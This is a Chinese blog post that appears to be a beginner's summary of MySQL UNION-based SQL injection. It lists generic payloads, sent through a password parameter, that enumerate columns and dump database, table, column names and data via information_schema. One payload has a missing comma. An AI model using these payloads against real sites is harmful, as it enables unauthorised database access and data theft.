<!DOCTYPE html><html lang=zh-CN><head><meta charset=utf-8><meta name=X-UA-Compatible content="IE=edge"><title>联合注入 | 初级 | 小结 | Blog | btwoa</title><meta name=description content="联合注入 | 初级 | 小结 | btwoa"><meta name=viewport content="width=device-width,initial-scale=1"><link rel=icon href=https://ovo.btwoa.com/favicon/hexo/favicon.png><link rel=stylesheet href=/css/apollo.css><link rel=search type=application/opensearchdescription+xml href=https://blog.btwoa.com/atom.xml title="Blog | btwoa"><script integrity=sha384-MWfCL6g1OTGsbSwfuMHc8+8J2u71/LA8dzlIN3ycajckxuZZmF+DNjdm7O6H3PSq src=//instant.page/5.1.1 type=module></script><!-- hexo injector head_end start --><link rel=manifest href=/manifest.json><!-- hexo injector head_end end --><meta name=generator content="Hexo 6.2.0"><link rel=alternate href=/atom.xml title="Blog | btwoa" type=application/atom+xml><link rel=alternate href=/rss.xml title="Blog | btwoa" type=application/rss+xml></head><body><div class=container data-bs-spy=scroll data-bs-target=#toc-nav data-bs-offset=0></div><div class=wrap><header><a class=logo-link href=/ ><img src=https://ovo.btwoa.com/blog.webp alt=logo></a><ul class="nav nav-list"><li class=nav-list-item><a class=nav-list-link href=https://btwoa.com target=_blank>主页</a></li><li class=nav-list-item><a class=nav-list-link href=/talk/ target=_self>说说</a></li><li class=nav-list-item><a class=nav-list-link href=/circle/ target=_self>小圈</a></li><li class=nav-list-item><a class=nav-list-link href=/link/ target=_self>友链</a></li><li class=nav-list-item><a class=nav-list-link href=/archives/ target=_self>归档</a></li><li class=nav-list-item><a class=nav-list-link href=https://monitor.btwoa.com target=_blank>监测</a></li></ul></header><main class=container><article class=post-block><h1 class=post-title>联合注入 | 初级 | 小结</h1><div class=post-info>2020年10月1日<div class=post-tags><a class=post-tag-link href=/tags/Injection/ rel=tag># 注入</a></div></div><div class=post-toc><h3 class=post-toc-title>联合注入 | 初级 | 小结</h3><nav class=navbar id=toc-nav><ol class=nav><li class="nav-item nav-level-2"><a class=nav-link href=#information-schema-%E5%BA%93><span class=nav-text>information_schema 库</span></a></li><li class="nav-item nav-level-2"><a class=nav-link href=#%E6%9E%9A%E4%B8%BE%E5%AD%97%E6%AE%B5%E6%95%B0><span class=nav-text>枚举字段数</span></a></li><li class="nav-item nav-level-2"><a class=nav-link href=#%E7%A1%AE%E8%AE%A4%E5%9B%9E%E6%98%BE%E5%AD%97%E6%AE%B5><span class=nav-text>确认回显字段</span></a></li><li class="nav-item nav-level-2"><a class=nav-link href=#%E6%94%B6%E9%9B%86%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80%E4%BF%A1%E6%81%AF><span class=nav-text>收集数据库基础信息</span></a></li><li class="nav-item nav-level-2"><a class=nav-link href=#%E6%94%B6%E9%9B%86%E8%A1%A8%E5%90%8D><span class=nav-text>收集表名</span></a></li><li class="nav-item nav-level-2"><a class=nav-link href=#%E6%94%B6%E9%9B%86%E5%AD%97%E6%AE%B5%E5%90%8D><span class=nav-text>收集字段名</span></a></li><li class="nav-item nav-level-2"><a class=nav-link href=#%E6%94%B6%E9%9B%86%E5%AF%B9%E5%BA%94%E6%95%B0%E6%8D%AE><span class=nav-text>收集对应数据</span></a></li><li class="nav-item nav-level-2"><a class=nav-link href=#%E5%88%A9%E7%94%A8-information-schema><span class=nav-text>利用 information_schema</span></a><ol class=nav-child><li class="nav-item nav-level-3"><a class=nav-link href=#%E6%94%B6%E9%9B%86%E6%89%80%E6%9C%89%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D><span class=nav-text>收集所有数据库名</span></a></li><li class="nav-item nav-level-3"><a class=nav-link href=#%E6%94%B6%E9%9B%86%E6%8C%87%E5%AE%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E8%A1%A8%E5%90%8D><span class=nav-text>收集指定数据库的表名</span></a></li><li class="nav-item nav-level-3"><a class=nav-link href=#%E6%94%B6%E9%9B%86%E6%8C%87%E5%AE%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8C%87%E5%AE%9A%E8%A1%A8%E7%9A%84%E5%AD%97%E6%AE%B5%E5%90%8D><span class=nav-text>收集指定数据库指定表的字段名</span></a></li><li class="nav-item nav-level-3"><a class=nav-link href=#%E6%94%B6%E9%9B%86%E6%8C%87%E5%AE%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8C%87%E5%AE%9A%E8%A1%A8%E7%9A%84%E6%8C%87%E5%AE%9A%E5%AD%97%E6%AE%B5%E4%BF%A1%E6%81%AF><span class=nav-text>收集指定数据库指定表的指定字段信息</span></a></li></ol></li></ol></nav></div><div class=post-content><p>利用UNION 操作符组合多个语句查询结果收集想要获取的信息</p><span id=more></span><p><strong>注意：本篇内容以 MySQL 为例，并不完全适用于其他数据库。若存在关键字过滤，需进行对应绕过。</strong></p><h2 id=information-schema-库><a href=#information-schema-库 class=headerlink title="information_schema 库"></a>information_schema 库</h2><p>MySQL（5.0以上版本） 自带的信息数据库，提供了访问数据库元数据的方式</p><p>记录所有表名信息的表：information_schema.tables</p><p>记录所有列名信息的表：information_schema.columns</p><p>数据库名：table_schema</p><p>表名：table_name</p><p>列名：column_name</p><h2 id=枚举字段数><a href=#枚举字段数 class=headerlink title=枚举字段数></a>枚举字段数</h2><p>利用 order by 关键词对字段名在表内的默认顺序进行排序确认字段是否存在，如1，2，……，n。当枚举至 n 时出现报错，则共有 n-1 个字段。</p><figure class="highlight plaintext"><table><tr><td class=gutter><pre><span class=line>1</span><br></pre></td><td class=code><pre><span class=line>password=-1&#x27; order by 1,2,3,n #</span><br></pre></td></tr></table></figure><h2 id=确认回显字段><a href=#确认回显字段 class=headerlink title=确认回显字段></a>确认回显字段</h2><p>利用 union select 确认回显字段</p><figure class="highlight plaintext"><table><tr><td class=gutter><pre><span class=line>1</span><br></pre></td><td class=code><pre><span class=line>password=-1&#x27; union select 1,2,3,n #</span><br></pre></td></tr></table></figure><h2 id=收集数据库基础信息><a href=#收集数据库基础信息 class=headerlink title=收集数据库基础信息></a>收集数据库基础信息</h2><p>操作系统 –&gt; @@version_compile_os</p><p>数据库信息 –&gt; version()</p><p>数据库用户 –&gt; user()</p><p>数据库名 –&gt; database()</p><p>通过与可回显字段替换实现相应查询</p><figure class="highlight plaintext"><table><tr><td class=gutter><pre><span class=line>1</span><br></pre></td><td class=code><pre><span class=line>password=-1&#x27; union select version(),database(),3,n #</span><br></pre></td></tr></table></figure><h2 id=收集表名><a href=#收集表名 class=headerlink title=收集表名></a>收集表名</h2><figure class="highlight plaintext"><table><tr><td class=gutter><pre><span class=line>1</span><br></pre></td><td class=code><pre><span class=line>password=-1&#x27; union select group_concat(table_name),2,3,n from information_schema.tables where table_schema=database() #</span><br></pre></td></tr></table></figure><h2 id=收集字段名><a href=#收集字段名 class=headerlink title=收集字段名></a>收集字段名</h2><figure class="highlight plaintext"><table><tr><td class=gutter><pre><span class=line>1</span><br></pre></td><td class=code><pre><span class=line>password=-1&#x27; union select group_concat(column_name),2,3,n from information_schema.columns where table_schema=database() and table_name=&#x27;table name&#x27; #</span><br></pre></td></tr></table></figure><h2 id=收集对应数据><a href=#收集对应数据 class=headerlink title=收集对应数据></a>收集对应数据</h2><figure class="highlight plaintext"><table><tr><td class=gutter><pre><span class=line>1</span><br></pre></td><td class=code><pre><span class=line>password=-1&#x27; union select group_concat(column name 1,column name 2,column name 3),2,3,n from table name #</span><br></pre></td></tr></table></figure><h2 id=利用-information-schema><a href=#利用-information-schema class=headerlink title="利用 information_schema"></a>利用 information_schema</h2><h3 id=收集所有数据库名><a href=#收集所有数据库名 class=headerlink title=收集所有数据库名></a>收集所有数据库名</h3><figure class="highlight plaintext"><table><tr><td class=gutter><pre><span class=line>1</span><br></pre></td><td class=code><pre><span class=line>password=-1&#x27; union select group_concat(schema_name),2,3,n from information_schema.schemata #</span><br></pre></td></tr></table></figure><h3 id=收集指定数据库的表名><a href=#收集指定数据库的表名 class=headerlink title=收集指定数据库的表名></a>收集指定数据库的表名</h3><figure class="highlight plaintext"><table><tr><td class=gutter><pre><span class=line>1</span><br></pre></td><td class=code><pre><span class=line>password=-1&#x27; union select group_concat(table_name)2,3,n from information_schema.tables where table_schema=&#x27;schema name&#x27; #</span><br></pre></td></tr></table></figure><h3 id=收集指定数据库指定表的字段名><a href=#收集指定数据库指定表的字段名 class=headerlink title=收集指定数据库指定表的字段名></a>收集指定数据库指定表的字段名</h3><figure class="highlight plaintext"><table><tr><td class=gutter><pre><span class=line>1</span><br></pre></td><td class=code><pre><span class=line>password=-1&#x27; union select group_concat(column_name),2,3,n from information_schema.columns where table_name=&#x27;table name&#x27; and table_schema=&#x27;schema name&#x27; #</span><br></pre></td></tr></table></figure><h3 id=收集指定数据库指定表的指定字段信息><a href=#收集指定数据库指定表的指定字段信息 class=headerlink title=收集指定数据库指定表的指定字段信息></a>收集指定数据库指定表的指定字段信息</h3><figure class="highlight plaintext"><table><tr><td class=gutter><pre><span class=line>1</span><br></pre></td><td class=code><pre><span class=line>password=-1&#x27; union select group_concat(column name 1,column name 2,column name 3),2,3,n from schema name.table name #</span><br></pre></td></tr></table></figure><link rel=stylesheet href=/css/spoiler.css type=text/css><script src=/js/spoiler.js type=text/javascript async></script></div></article></main><footer><div class=paginator><a class=prev href=/2f57a694/ >PREV</a><a class=next href=/efdbbe03/ >NEXT</a></div><div id=tcomment></div><script src=/js/twikoo.all.min.js></script><script>twikoo.init({envId:"https://twikoo.btwoa.com/",el:"#tcomment",path:"window.location.pathname",lang:"zh-CN"})</script><div class=copyright><p>Copyright Ⓒ 2019-2022 <a href=https://beian.miit.gov.cn/ target=_blank>陇ICP备20001210号</a></p></div></footer></div><script>!function(e,a,t,g,n,o){e.GoogleAnalyticsObject=g,e.ga||(e.ga=function(){(e.ga.q=e.ga.q||[]).push(arguments)}),e.ga.l=+new Date,n=a.createElement(t),o=a.getElementsByTagName(t)[0],n.src="/js/google-analytics.js",o.parentNode.insertBefore(n,o)}(window,document,"script","ga"),ga("create","UA-235222810-1","auto"),ga("send","pageview")</script><script>var _hmt=_hmt||[];!function(){var e=document.createElement("script"),t=(e.src="https://hm.baidu.com/hm.js?01b308cf7144f10b91966ae6f284d4cb",document.getElementsByTagName("script")[0]);t.parentNode.insertBefore(e,t)}()</script><script>!function(t){"use strict";function s(){e.LA.ids.push(i)}var e=window,c=document,i=t,o="".concat("https:"===c.location.protocol?"https://":"http://","sdk.51.la/js-sdk-pro.min.js"),n=c.createElement("script"),c=c.getElementsByTagName("script")[0];n.type="text/javascript",n.setAttribute("charset","UTF-8"),n.async=!0,n.src=o,n.id="LA_COLLECT",i.d=n,e.LA?e.LA.ids&&s():(e.LA=t,e.LA.ids=[],s()),c.parentNode.insertBefore(n,c)}({id:"JoXIxCzhNG7DwlUJ",ck:"JoXIxCzhNG7DwlUJ"})</script><script>!function(e,n){var t=n.createElement("script"),n=n.getElementsByTagName("script")[0];t.type="text/javascript",t.crossorigin=!0,t.onload=function(){(new e.LingQue.Monitor).init({id:"JoewdpDnTBrOF23U",sendSuspicious:!0,sendSpaPv:!0})},n.parentNode.insertBefore(t,n),t.src="https://sdk.51.la/perf/js-sdk-perf.min.js"}(window,document)</script><script defer=defer src=/js/bootstrap.min.js type=text/javascript></script><script defer=defer src=/js/console.js type=text/javascript></script><!-- hexo injector body_end start --><script>"serviceWorker"in navigator&&window.addEventListener("load",()=>{navigator.serviceWorker.register("/sw.js")})</script><!-- hexo injector body_end end --></body></html>